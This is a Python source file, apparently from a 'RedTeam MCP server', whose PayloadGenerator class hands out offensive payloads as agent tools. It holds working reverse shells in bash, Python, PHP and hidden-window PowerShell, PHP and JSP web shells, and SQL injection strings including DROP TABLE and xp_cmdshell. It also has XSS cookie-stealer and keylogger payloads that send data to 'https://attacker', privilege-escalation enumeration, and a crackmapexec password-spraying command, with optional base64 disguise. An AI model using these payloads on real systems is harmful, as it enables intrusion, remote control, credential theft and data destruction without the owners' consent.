"""Payload generation helpers for the RedTeam MCP server."""

from __future__ import annotations

import base64
import re
from dataclasses import dataclass, field
from textwrap import dedent
from typing import Dict, Iterable

_HOST_PATTERN = re.compile(r"^[a-zA-Z0-9_.-]+$")
_SERVICE_PATTERN = re.compile(r"^[a-z0-9_\-]+$")


def _sanitize_host(host: str) -> str:
    """Return a stripped host name if it matches the expected pattern."""

    candidate = host.strip()
    if not _HOST_PATTERN.fullmatch(candidate):
        raise ValueError(f"Invalid host value: {host}")
    return candidate


def _sanitize_service(service: str) -> str:
    """Return a lowercase service identifier validated by regex."""

    candidate = service.strip().lower()
    if not _SERVICE_PATTERN.fullmatch(candidate):
        raise ValueError(f"Invalid service name: {service}")
    return candidate


@dataclass(slots=True)
class PayloadGenerator:
    """Generate common payloads and command snippets for MCP tools."""

    reverse_shell_templates: Dict[str, str] = field(default_factory=lambda: {
        "bash": "bash -i >& /dev/tcp/{host}/{port} 0>&1",
        "python": "python3 -c \"import os,pty,socket as s;h='{host}';p={port};c=s.socket();c.connect((h,p));[os.dup2(c.fileno(),fd) for fd in (0,1,2)];pty.spawn('bash')\"",
        "php": "php -r '$s=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient(\'{host}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close()\"",
    })
    web_shell_templates: Dict[str, str] = field(default_factory=lambda: {
        "php_simple": "<?php if(isset($_REQUEST['cmd'])){echo '<pre>';system($_REQUEST['cmd']);echo '</pre>'; } ?>",
        "php_advanced": "<?php $p=\"{password}\";if(!isset($_POST['pass'])||$_POST['pass']!==$p){die('Auth required');}if(isset($_POST['cmd'])){echo '<pre>';system($_POST['cmd']);echo '</pre>'; } ?>",
        "jsp": dedent("""
            <%@ page import="java.io.*" %>
            <HTML><BODY>
            <FORM METHOD=POST>
            Command: <INPUT NAME=cmd TYPE=TEXT>
            <INPUT TYPE=SUBMIT VALUE="Run">
            </FORM>
            <PRE>
            <%
            if (request.getParameter("cmd") != null) {
                String cmd = request.getParameter("cmd");
                Process p = Runtime.getRuntime().exec(cmd);
                OutputStream os = p.getOutputStream();
                InputStream in = p.getInputStream();
                DataInputStream dis = new DataInputStream(in);
                String disr = dis.readLine();
                while ( disr != null ) {
                    out.println(disr);
                    disr = dis.readLine();
                }
            }
            %>
            </PRE>
            </BODY></HTML>
        """),
    })

    def generate_reverse_shell(self, shell_type: str, lhost: str, lport: int, encode: bool) -> str:
        """Return a formatted reverse shell payload."""

        template = self._get_template(self.reverse_shell_templates, shell_type, "reverse shell")
        host = _sanitize_host(lhost)
        command = template.format(host=host, port=int(lport))
        if encode:
            encoded = base64.b64encode(command.encode()).decode()
            return dedent(f"""
                # Reverse Shell
                **Type:** {shell_type}
                **Host:** {host}
                **Port:** {lport}

                ```bash
                {command}
                ```

                ## Base64 Encoded
                ```text
                {encoded}
                ```
            """)
        return dedent(f"""
            # Reverse Shell
            **Type:** {shell_type}
            **Host:** {host}
            **Port:** {lport}

            ```bash
            {command}
            ```
        """)

    def generate_web_shell(self, shell_type: str, password: str | None, obfuscate: bool) -> str:
        """Return a web shell snippet with optional obfuscation notice."""

        template = self._get_template(self.web_shell_templates, shell_type, "web shell")
        if "{password}" in template:
            safe_password = password or "changeme"
            template = template.format(password=safe_password)
        body = dedent(f"""
            # Web Shell
            **Type:** {shell_type}
            **Password Protected:** {bool(password)}
            **Obfuscated:** {obfuscate}

            ```{self._detect_language(shell_type)}
            {template}
            ```
        """)
        if obfuscate:
            encoded = base64.b64encode(template.encode()).decode()
            body += dedent(f"""
                ## Base64 Payload
                ```text
                {encoded}
                ```
            """)
        return body

    def generate_sqli_payloads(self, injection_type: str, columns: int | None, database: str) -> str:
        """Return SQL injection payloads tailored to the supplied parameters."""

        payloads = {
            "auth_bypass": [
                "' OR '1'='1" ,
                "admin' --",
                "' OR '1'='1' -- -",
            ],
            "union_based": [
                f"' UNION SELECT NULL{', NULL' * (max(columns - 1, 0) if columns else 1)} -- -",
                "' UNION SELECT user(), database(), version() -- -",
            ],
            "error_based": [
                "1 AND updatexml(null, concat(0x3a, database()), null)",
                "1 AND extractvalue(rand(), concat(0x3a, version()))",
            ],
            "blind_boolean": [
                "1' AND '1'='1", "1' AND '1'='0",
            ],
            "blind_time": [
                "1' WAITFOR DELAY '0:0:5'--",
                "1) OR pg_sleep(5)--",
            ],
            "stacked_queries": [
                "1; DROP TABLE users;--",
                "1; EXEC xp_cmdshell('whoami');--",
            ],
        }
        selected = payloads.get(injection_type.lower(), [])
        if not selected:
            raise ValueError(f"Unsupported SQLi type: {injection_type}")

        header = dedent(f"""
            # SQL Injection Payloads
            **Type:** {injection_type}
            **Database:** {database}
            **Columns:** {columns or 'auto-detect'}
        """)
        body = "\n".join(f"- `{payload}`" for payload in selected)
        return f"{header}\n\n{body}"

    def generate_xss_payloads(self, xss_type: str, callback_url: str | None, bypass_filters: bool) -> str:
        """Return XSS payload examples."""

        payloads = {
            "reflected": [
                "<script>alert('xss')</script>",
                "<img src=x onerror=alert(1)>",
            ],
            "stored": [
                "<svg/onload=alert(document.cookie)>",
                "<iframe src=javascript:alert(1)>",
            ],
            "dom_based": [
                '"><script>alert(document.domain)</script>',
            ],
            "cookie_stealer": [
                "<script>new Image().src='{0}?c='+document.cookie;</script>".format(
                    callback_url or "https://attacker"
                ),
            ],
            "keylogger": [
                "<script>document.onkeypress=function(e){fetch('https://attacker/log?c='+e.key)}</script>",
            ],
            "phishing": [
                "<script>location='https://example.com/login?continue='+encodeURIComponent(location)</script>",
            ],
        }
        selected = payloads.get(xss_type.lower(), [])
        if not selected:
            raise ValueError(f"Unsupported XSS type: {xss_type}")

        header = dedent(f"""
            # XSS Payloads
            **Type:** {xss_type}
            **Callback URL:** {callback_url or 'not provided'}
            **Bypass Filters:** {bypass_filters}
        """)
        body = "\n".join(f"- `{payload}`" for payload in selected)
        if bypass_filters:
            body += "\n- `%3Cscript%3Ealert('xss')%3C/script%3E`"
        return f"{header}\n\n{body}"

    def generate_privesc_enum(self, target_os: str, check_type: str) -> str:
        """Return privilege escalation enumeration commands."""

        commands = {
            "linux": {
                "all": [
                    "uname -a",
                    "id",
                    "find / -perm -4000 -type f 2>/dev/null",
                    "sudo -l",
                ],
                "quick": ["uname -a", "id"],
                "kernel": ["cat /proc/version", "uname -r"],
                "suid": ["find / -perm -4000 -type f 2>/dev/null"],
                "sudo": ["sudo -l"],
                "cron": ["cat /etc/crontab"],
                "services": ["systemctl list-units --type=service"],
            },
            "windows": {
                "all": [
                    "systeminfo",
                    "whoami /priv",
                    "wmic qfe list", 
                    "dir \"C:\\\\Program Files\"",
                ],
                "quick": ["systeminfo", "whoami"],
                "kernel": ["wmic qfe get HotFixID,InstalledOn"],
                "suid": ["accesschk.exe -uws \"Users\" * /accepteula"],
                "sudo": ["whoami /groups"],
                "cron": ["schtasks /query /fo LIST /v"],
                "services": ["sc query state= all"],
            },
        }
        os_commands = commands.get(target_os.lower())
        if not os_commands:
            raise ValueError(f"Unsupported OS: {target_os}")
        selected = os_commands.get(check_type.lower()) or os_commands["all"]
        body = "\n".join(f"- `{cmd}`" for cmd in selected)
        return dedent(f"""
            # Privilege Escalation Enumeration
            **Target OS:** {target_os}
            **Check Type:** {check_type}

            {body}
        """)

    def generate_cred_spray(self, target_service: str, usernames: Iterable[str], passwords: Iterable[str], target: str | None) -> str:
        """Return credential spraying guidance."""

        service = _sanitize_service(target_service)
        user_list = ", ".join(sorted({name.strip() for name in usernames if name.strip()}))
        password_list = ", ".join(sorted({pw.strip() for pw in passwords if pw.strip()}))
        target_info = target or "not specified"
        command = dedent(f"""
            crackmapexec {service} {target or '<target>'} -u users.txt -p passwords.txt --continue-on-success
        """)
        summary = dedent(f"""
            # Credential Spraying Plan
            **Service:** {service}
            **Target:** {target_info}

            ## Usernames
            {user_list or 'None provided'}

            ## Passwords
            {password_list or 'None provided'}

            ## Example Command
            ```bash
            {command.strip()}
            ```
        """)
        return summary

    def _detect_language(self, shell_type: str) -> str:
        """Infer the programming language for Markdown fencing."""

        if shell_type.startswith("php"):
            return "php"
        if shell_type == "jsp":
            return "jsp"
        return "text"

    @staticmethod
    def _get_template(templates: Dict[str, str], key: str, label: str) -> str:
        """Return template ``key`` from ``templates`` with validation."""

        normalized = key.lower().strip()
        if normalized not in templates:
            available = ", ".join(sorted(templates))
            raise ValueError(f"Unsupported {label} type: {key}. Available: {available}")
        return templates[normalized]
